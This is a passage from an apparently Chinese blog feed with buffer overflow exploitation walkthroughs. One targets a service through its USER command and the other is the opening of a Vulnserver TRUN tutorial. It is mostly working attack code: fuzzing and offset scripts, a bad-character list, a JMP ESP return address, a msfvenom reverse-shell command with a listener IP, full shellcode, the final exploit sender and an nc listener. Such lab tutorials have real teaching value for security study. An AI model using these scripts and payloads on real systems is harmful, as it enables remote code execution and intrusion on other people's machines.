        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">"B"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">"C"</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Sheng"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>发现足够容纳shellcode的大小(普通的shellcode大小为300-400字节)</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209154056809.png" alt="image-20201209154056809"></p>
<h4 id="查找坏字符"><a href="#查找坏字符" class="headerlink" title="查找坏字符"></a>查找坏字符</h4><ul>
<li>不同类型的程序，协议，漏洞，会将某些字符认为时坏字符，这些字符有固定用途<ul>
<li>返回地址、Shellcode、butter中都不能出现坏字符</li>
<li>NULL byte<code>0x00</code>表示字符串的结束</li>
<li>renturn <code>0x0D</code>表示换行，表示命令输入完成</li>
<li><code>0x0A</code>表示回车</li>
</ul>
</li>
<li>查找坏字符思路： 发送(<code>0x00</code>–<code>0xff</code>)256个字符，查找所有坏字符</li>
</ul>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2004</span>
badchars <span class="token operator">=</span> <span class="token punctuation">(</span>
<span class="token string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span>
<span class="token string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>
<span class="token string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span>
<span class="token string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>
<span class="token string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>
<span class="token string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>
<span class="token string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span>
<span class="token string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>
<span class="token string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span>
<span class="token string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>
<span class="token string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span>
<span class="token string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>
<span class="token string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span>
<span class="token string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>
<span class="token string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span>
<span class="token string">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"</span>
<span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">"B"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> badchars<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>发现坏字符之后<code>0x0a</code></p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209165107086.png" alt="image-20201209165107086"></p>
<h3 id="重定向数据流"><a href="#重定向数据流" class="headerlink" title="重定向数据流"></a>重定向数据流</h3><ul>
<li><strong>用ESP地址代替EIP的值，但是ESP地址是变化的，不能一直按照同一个地址进行编码</strong></li>
<li><strong>思路：</strong><ul>
<li>在内存地址中寻找固定的系统模块</li>
<li>jmp esp是汇编语言,转成十六进制可以使用<code>nasm_shell.rb</code><ul>
<li><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223164131632.png" alt="image-20201223164131632"></li>
</ul>
</li>
<li>在模块中寻找<code>JMP ESP</code>指令的地址跳转，再由该指令间接跳转至ESP，从而执行shellcode</li>
</ul>
</li>
</ul>
<blockquote>
<p>使用<code>Immunityinc debugger</code> 在程序的<code>dll</code>中找到具有<code>JMP ESP</code>命令的内存地址</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201116140845375.png" alt="image-20201116140845375"></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2004</span>

s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span><span class="token string">"\x7b\x46\x86\x7c"</span> <span class="token operator">+</span> <span class="token string">"C"</span><span class="token operator">*</span><span class="token number">500</span> <span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201116140901583.png" alt="image-20201116140901583"></p>
<blockquote>
<p>这里我们选择<code>kernel32.dll</code> 进行搜索， 搜索JMP ESP命令</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201116141504015.png" alt="image-20201116141504015"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201116141557567.png" alt="image-20201116141557567"></p>
<blockquote>
<p>这里返回的内存地址为<code>0x7C86467B</code>, 这个地址没有坏字符，我们可以来利用（坏字符是会破坏我们漏洞的字符，如<code>0x00</code>）,因为这里我们是小端显示，所以构造shellcode的时候需要倒过来写！</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201210102700026.png" alt="image-20201210102700026"></p>
<blockquote>
<p>按<code>F7</code>执行下一步</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201210102823662.png" alt="image-20201210102823662"></p>
<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><pre class=" language-shell"><code class="language-shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b "\x00\x0a\x0d" -a x86
# -b "\x00\x0a\x0d" 去掉坏字符 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223173429738.png" alt="image-20201223173429738"></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

buf <span class="token operator">=</span>  b<span class="token string">""</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xdd\xc1\xd9\x74\x24\xf4\x58\xbb\x23\x98\x46\x1c\x29"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xc9\xb1\x52\x31\x58\x17\x83\xc0\x04\x03\x7b\x8b\xa4"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xe9\x87\x43\xaa\x12\x77\x94\xcb\x9b\x92\xa5\xcb\xf8"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xd7\x96\xfb\x8b\xb5\x1a\x77\xd9\x2d\xa8\xf5\xf6\x42"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x19\xb3\x20\x6d\x9a\xe8\x11\xec\x18\xf3\x45\xce\x21"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x3c\x98\x0f\x65\x21\x51\x5d\x3e\x2d\xc4\x71\x4b\x7b"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xd5\xfa\x07\x6d\x5d\x1f\xdf\x8c\x4c\x8e\x6b\xd7\x4e"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x31\xbf\x63\xc7\x29\xdc\x4e\x91\xc2\x16\x24\x20\x02"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x67\xc5\x8f\x6b\x47\x34\xd1\xac\x60\xa7\xa4\xc4\x92"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x5a\xbf\x13\xe8\x80\x4a\x87\x4a\x42\xec\x63\x6a\x87"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x6b\xe0\x60\x6c\xff\xae\x64\x73\x2c\xc5\x91\xf8\xd3"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x09\x10\xba\xf7\x8d\x78\x18\x99\x94\x24\xcf\xa6\xc6"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x86\xb0\x02\x8d\x2b\xa4\x3e\xcc\x23\x09\x73\xee\xb3"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x05\x04\x9d\x81\x8a\xbe\x09\xaa\x43\x19\xce\xcd\x79"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xdd\x40\x30\x82\x1e\x49\xf7\xd6\x4e\xe1\xde\x56\x05"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xf1\xdf\x82\x8a\xa1\x4f\x7d\x6b\x11\x30\x2d\x03\x7b"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xbf\x12\x33\x84\x15\x3b\xde\x7f\xfe\x4e\x18\x7a\x90"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x26\x24\x84\x7d\xe6\xa1\x62\x17\x18\xe4\x3d\x80\x81"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xad\xb5\x31\x4d\x78\xb0\x72\xc5\x8f\x45\x3c\x2e\xe5"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x55\xa9\xde\xb0\x07\x7c\xe0\x6e\x2f\xe2\x73\xf5\xaf"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x6d\x68\xa2\xf8\x3a\x5e\xbb\x6c\xd7\xf9\x15\x92\x2a"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x9f\x5e\x16\xf1\x5c\x60\x97\x74\xd8\x46\x87\x40\xe1"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xc2\xf3\x1c\xb4\x9c\xad\xda\x6e\x6f\x07\xb5\xdd\x39"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xcf\x40\x2e\xfa\x89\x4c\x7b\x8c\x75\xfc\xd2\xc9\x8a"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\x31\xb3\xdd\xf3\x2f\x23\x21\x2e\xf4\x43\xc0\xfa\x01"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xec\x5d\x6f\xa8\x71\x5e\x5a\xef\x8f\xdd\x6e\x90\x6b"</span>
buf <span class="token operator">+=</span> b<span class="token string">"\xfd\x1b\x95\x30\xb9\xf0\xe7\x29\x2c\xf6\x54\x49\x65"</span>

<span class="token comment" spellcheck="true"># "\x90" * 30 30个无操作符</span>
payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">2004</span> <span class="token operator">+</span> <span class="token string">"\x7b\x46\x86\x7c"</span> <span class="token operator">+</span> <span class="token string">"\x90"</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">+</span> buf
host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true"># receive IP</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># receive port</span>

s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER "</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223190010367.png" alt="image-20201223190010367"></p>
<blockquote>
<p>本地监听4455端口</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">nc -vlp 4455
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223190036325.png" alt="image-20201223190036325"></p>
]]></content>
      <tags>
        <tag>复现</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出分析与利用(二)</title>
    <url>/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%BA%8C)/</url>
    <content><![CDATA[<h1 id="Vulnserver溢出漏洞分析与利用"><a href="#Vulnserver溢出漏洞分析与利用" class="headerlink" title="Vulnserver溢出漏洞分析与利用"></a>Vulnserver溢出漏洞分析与利用</h1><blockquote>
<p>vulnserver.exe是运行在windows上的程序，启动后，等待接收TCP连接。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201224101337168.png" alt="image-20201224101337168"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap扫描目标机，得知开启9999端口，即vulnserver程序。</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425171348693.png" alt="image-20210425171348693"></p>
<h2 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h2><p><strong>测试是否存在缓冲区溢出问题</strong></p>
<blockquote>
<p>模糊测试py脚本如下：</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">100</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        fuzz <span class="token operator">+=</span> <span class="token number">150</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End...,Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>进行模糊测试</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425171642279.png" alt="image-20210425171642279"></p>
<blockquote>
<p>服务崩溃，EIP为发送的A</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425171953692.png" alt="image-20210425171953692"></p>
<p><strong>说明该服务<code>TRUN</code>命令存在缓冲区溢出漏洞</strong></p>
<h2 id="查找偏移量（Finding-the-offset）"><a href="#查找偏移量（Finding-the-offset）" class="headerlink" title="查找偏移量（Finding the offset）"></a>查找偏移量（Finding the offset）</h2><blockquote>
<p>使用<code>Metasploit</code>的pattern_create工具创建一个500大小的字符串</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425172632311.png" alt="image-20210425172632311"></p>
<blockquote>
<p>查找偏移量py脚本如下：</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2000</span>
payload <span class="token operator">=</span> <span class="token string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End...,Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>重启服务<code>Ctrl+2</code>-&gt;<code>F9</code>，开始查找偏移量测试</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425172827935.png" alt="image-20210425172827935"></p>
<blockquote>
<p><code>EIP</code>寄存器的值是<code>0x41316141</code></p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425172905141.png" alt="image-20210425172905141"></p>
<blockquote>
<p>使用Metasploit工具<code>pattern_offset</code>来确定字节数</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">./pattern_offset.rb -l 500 -q 41316141
# -q参数为要查询的地址，-l参数为要查询的字符序列的长度
# 上图中我们得出的地址是 0x61413161, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 61413161
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425173117087.png" alt="image-20210425173117087"></p>
<p><strong>计算结果为<code>3</code>, 也就是说覆盖返回地址是在<code>[2003-2007]</code> 这四个字节</strong></p>
<blockquote>
<p>验证偏移量地址</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2003</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"TRUN /:./"</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End...,Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>程序崩溃后EIP为4个B，说明目前我们已经可以精确覆盖EIP了</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210425181333848.png" alt="image-20210425181333848"></p>
